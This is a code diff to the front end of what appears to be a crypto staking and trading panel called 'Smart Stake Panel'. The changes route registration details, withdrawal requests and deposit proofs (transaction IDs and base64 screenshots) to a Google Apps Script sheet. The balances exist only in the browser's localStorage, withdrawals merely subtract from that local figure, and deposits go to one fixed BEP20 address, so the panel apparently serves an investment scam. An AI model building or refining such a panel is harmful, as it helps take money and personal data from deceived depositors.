@@ -175,7 +175,7 @@
     <div class="input-group"><label>Email Address</label><input type="email" id="reg-email" class="input-control" placeholder="name@gmail.com"></div>
     <div class="input-group"><label>Phone Number</label><input type="tel" id="reg-phone" class="input-control" placeholder="+92 300 0000000"></div>
     <div class="input-group"><label>Referral Code (Optional)</label><input type="text" id="reg-refcode" class="input-control" placeholder="e.g. REF123456"></div>
-    <button class="btn" onclick="handleRegistration()" style="margin-top: 10px;">Register & Access Panel</button>
+    <button class="btn" id="reg-btn" onclick="handleRegistration()" style="margin-top: 10px;">Register & Access Panel</button>
 </div>
 
 <!-- Main Application Dashboard -->
@@ -248,37 +248,12 @@
 </div>
 
 <script>
-    // Live Deployment URL
-    const API_URL = "https://script.google.com/macros/s/AKfycbzVYmxFwN6WcoSG65aab8Ysw4SMjBA79KivVHPIwXol8hh9ki8zuuEI2C4AWaQFRpRQtw/exec";
-
+    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxbnJtSb5uMwV0n16CHUmqxn50wN4aVyDhbTCnXl3XqBzKMgqTgLtuclMOdA_kN8wdQFw/exec";
     const DEPOSIT_ADDRESS = "0xfeff2067ef1a43aa4bca186f702b2669971debbd";
     const NETWORK_NAME = "BNB Smart Chain (BEP20)";
 
     let currentUser = JSON.parse(localStorage.getItem('traderUser')) || null;
     let chartAnimationInterval = null;
-
-    /* Live Online / Offline Sync with Google Sheet */
-    function syncOnlineStatus() {
-        if (!currentUser || !currentUser.email) return;
-        fetch(API_URL, {
-            method: "POST",
-            mode: "no-cors",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                action_type: "user_online",
-                email: currentUser.email
-            })
-        });
-    }
-
-    window.addEventListener("pagehide", function () {
-        if (!currentUser || !currentUser.email) return;
-        const payload = JSON.stringify({
-            action_type: "user_offline",
-            email: currentUser.email
-        });
-        navigator.sendBeacon(API_URL, payload);
-    });
 
     // Stars particle effect
     const container = document.getElementById('stars-container');
@@ -325,7 +300,6 @@
             loadBalances();
             renderTradeHistory();
             checkTradeLockStatus();
-            syncOnlineStatus();
         } else {
             document.getElementById('auth-screen').style.display = 'block';
             document.getElementById('main-dashboard').style.display = 'none';
@@ -349,31 +323,44 @@
         return 'REF' + Math.abs(hash).toString(16).toUpperCase().substring(0, 6);
     }
 
-    function handleRegistration() {
+    /* ---------------- 1. REGISTRATION DATA SUBMISSION ---------------- */
+    async function handleRegistration() {
         const fname = document.getElementById('reg-fname').value.trim();
         const lname = document.getElementById('reg-lname').value.trim();
         const email = document.getElementById('reg-email').value.trim().toLowerCase();
         const phone = document.getElementById('reg-phone').value.trim();
+        const refBy = document.getElementById('reg-refcode').value.trim();
 
         if (!fname || !email || !phone) return alert('Please fill in all required fields.');
 
+        const regBtn = document.getElementById('reg-btn');
+        regBtn.disabled = true;
+        regBtn.innerText = "Registering...";
+
         let myRefCode = generateReferralCode(email);
+        let fullName = `${fname} ${lname}`.trim();
+
+        // Send registration to Google Sheet
+        try {
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    action_type: "register",
+                    name: fullName,
+                    email: email,
+                    phone: phone,
+                    ref_code: myRefCode,
+                    referred_by: refBy
+                })
+            });
+        } catch (err) {
+            console.error("Sheets error:", err);
+        }
+
         currentUser = { fname, lname, email, phone, refCode: myRefCode };
         localStorage.setItem('traderUser', JSON.stringify(currentUser));
-
-        // Sync with Web App Sheet Database
-        fetch(API_URL, {
-            method: "POST",
-            mode: "no-cors",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                action_type: "register",
-                name: `${fname} ${lname}`.trim(),
-                email: email,
-                phone: phone,
-                initial_balance: 0
-            })
-        });
 
         document.getElementById('auth-screen').style.display = 'none';
         document.getElementById('sync-overlay').style.display = 'flex';
@@ -575,7 +562,7 @@
         container.innerHTML = html;
     }
 
-    /* ---------------- WITHDRAWAL SYSTEM (50$ LIMIT + TRON/BNB NETWORKS) ---------------- */
+    /* ---------------- 2. WITHDRAWAL DATA SUBMISSION ---------------- */
 
     function handleWithdrawalClick() {
         let currBal = parseFloat(localStorage.getItem('currentBal')) || 0.00;
@@ -612,14 +599,14 @@
                 <input type="text" id="with-address" class="input-control" placeholder="Enter your wallet address">
             </div>
 
-            <button class="btn" onclick="submitWithdrawalRequest()" style="background: linear-gradient(135deg, #FFD700, #d97706); color:#000; font-weight:800; margin-top:10px; margin-bottom:8px;">Submit Withdrawal Request</button>
+            <button class="btn" id="with-sub-btn" onclick="submitWithdrawalRequest()" style="background: linear-gradient(135deg, #FFD700, #d97706); color:#000; font-weight:800; margin-top:10px; margin-bottom:8px;">Submit Withdrawal Request</button>
             <button class="btn" onclick="closePopup()" style="background:#334155; margin-bottom:0;">Cancel</button>
         `;
 
         showPopup("💰 Withdraw Funds", withContent);
     }
 
-    function submitWithdrawalRequest() {
+    async function submitWithdrawalRequest() {
         let currBal = parseFloat(localStorage.getItem('currentBal')) || 0.00;
         const net = document.getElementById('with-network').value;
         const amt = parseFloat(document.getElementById('with-amount').value);
@@ -629,26 +616,33 @@
         if (amt > currBal) return alert("Entered amount exceeds your Current Balance!");
         if (!addr) return alert("Please enter a valid destination wallet address.");
 
+        const subBtn = document.getElementById('with-sub-btn');
+        if (subBtn) { subBtn.disabled = true; subBtn.innerText = "Submitting..."; }
+
+        // Send Withdrawal Data to Google Sheet
+        try {
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    action_type: "request_withdrawal",
+                    email: currentUser.email,
+                    amount: amt,
+                    network: net,
+                    address: addr
+                })
+            });
+        } catch (err) {
+            console.error("Withdrawal Sheets Error:", err);
+        }
+
         let newBal = currBal - amt;
         let withBal = (parseFloat(localStorage.getItem('withdrawalBal')) || 0.00) + amt;
 
         localStorage.setItem('currentBal', newBal.toFixed(2));
         localStorage.setItem('withdrawalBal', withBal.toFixed(2));
         loadBalances();
-
-        // Push withdrawal entry to Google Sheet
-        fetch(API_URL, {
-            method: "POST",
-            mode: "no-cors",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                action_type: "request_withdrawal",
-                email: currentUser.email,
-                amount: amt,
-                network: net,
-                address: addr
-            })
-        });
 
         const successNotice = `
             <div style="text-align:center;">
@@ -660,7 +654,7 @@
         showPopup("💰 Withdrawal Pending", successNotice);
     }
 
-    /* ---------------- ADD FUNDS / DEPOSIT MODAL ---------------- */
+    /* ---------------- 3. DEPOSIT DATA SUBMISSION ---------------- */
 
     function openDepositModal() {
         const depContent = `
@@ -689,20 +683,65 @@
             </div>
 
             <div class="input-group">
-                <label>Upload Payment Screenshot / TxID Proof</label>
+                <label>Transaction Hash / TxID / Proof Note</label>
+                <input type="text" id="dep-txid" class="input-control" placeholder="e.g. 0x123abc456def...">
+            </div>
+
+            <div class="input-group">
+                <label>Upload Payment Screenshot Proof</label>
                 <input type="file" id="dep-proof" class="input-control" accept="image/*">
             </div>
 
-            <button class="btn" onclick="submitDepositProof()" style="background:#059669; margin-top:10px; margin-bottom:8px;">Submit Deposit Proof</button>
+            <button class="btn" id="dep-sub-btn" onclick="submitDepositProof()" style="background:#059669; margin-top:10px; margin-bottom:8px;">Submit Deposit Proof</button>
             <button class="btn" onclick="closePopup()" style="background:#334155; margin-bottom:0;">Cancel</button>
         `;
 
         showPopup("💳 Add Funds / Deposit", depContent);
     }
 
-    function submitDepositProof() {
+    async function submitDepositProof() {
         const amt = document.getElementById('dep-amount').value;
+        const txid = document.getElementById('dep-txid').value.trim();
+        const fileInput = document.getElementById('dep-proof');
+
         if (!amt || parseFloat(amt) < 100) return alert("Minimum deposit amount is $100.");
+
+        const subBtn = document.getElementById('dep-sub-btn');
+        if (subBtn) { subBtn.disabled = true; subBtn.innerText = "Submitting..."; }
+
+        let screenshotBase64 = "";
+
+        // Helper function to read image as Base64 string
+        if (fileInput && fileInput.files.length > 0) {
+            try {
+                screenshotBase64 = await new Promise((resolve, reject) => {
+                    const reader = new FileReader();
+                    reader.onload = () => resolve(reader.result);
+                    reader.onerror = error => reject(error);
+                    reader.readAsDataURL(fileInput.files[0]);
+                });
+            } catch (e) {
+                console.error("Image read error", e);
+            }
+        }
+
+        // Send Deposit Request to Google Sheet
+        try {
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    action_type: "request_deposit",
+                    email: currentUser.email,
+                    amount: amt,
+                    txid: txid,
+                    screenshot: screenshotBase64
+                })
+            });
+        } catch (err) {
+            console.error("Deposit Sheets Error:", err);
+        }
 
         const notice = `
             <div style="text-align:center;">
@@ -788,7 +827,7 @@
         showPopup("🤝 Referral Program", refHtml);
     }
 
-    /* ---------------- REDESIGNED PROFESSIONAL PROFILE MODAL WITH SIGN OUT ---------------- */
+    /* ---------------- PROFILE MODAL ---------------- */
 
     function openProfileModal() {
         let initial = (currentUser.fname ? currentUser.fname.charAt(0) : "U").toUpperCase();
@@ -826,12 +865,6 @@
 
     function handleSignOut() {
         if (confirm("Are you sure you want to sign out from Smart Stake Panel?")) {
-            if (currentUser && currentUser.email) {
-                navigator.sendBeacon(API_URL, JSON.stringify({
-                    action_type: "user_offline",
-                    email: currentUser.email
-                }));
-            }
             localStorage.removeItem('traderUser');
             currentUser = null;
             closePopup();
